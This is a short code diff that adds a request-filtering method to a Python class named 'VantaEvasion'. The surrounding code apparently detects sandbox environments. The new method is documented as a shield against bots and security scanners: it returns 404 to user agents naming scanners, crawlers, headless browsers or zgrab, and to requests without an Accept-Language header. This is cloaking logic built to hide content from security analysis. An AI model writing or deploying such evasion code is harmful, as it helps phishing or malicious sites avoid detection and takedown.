@@ -32,3 +32,19 @@ class VantaEvasion:
         if client_info.get("battery") == 100 and client_info.get("gpu") == "Software Renderer":
             return True
         return False
+
+    def validate_request(self, user_agent, headers):
+        """
+        ROLE: Shield logic to filter out bots and security scanners.
+        IF: Bot detected -> Returns 404 (handled by calling layer).
+        """
+        bot_keywords = ["bot", "crawler", "spider", "scan", "headless", "zgrab"]
+        ua = user_agent.lower()
+        if any(key in ua for key in bot_keywords):
+            return False
+        
+        # Strict Header Check (Human-like presence)
+        if "Accept-Language" not in headers:
+            return False
+            
+        return True
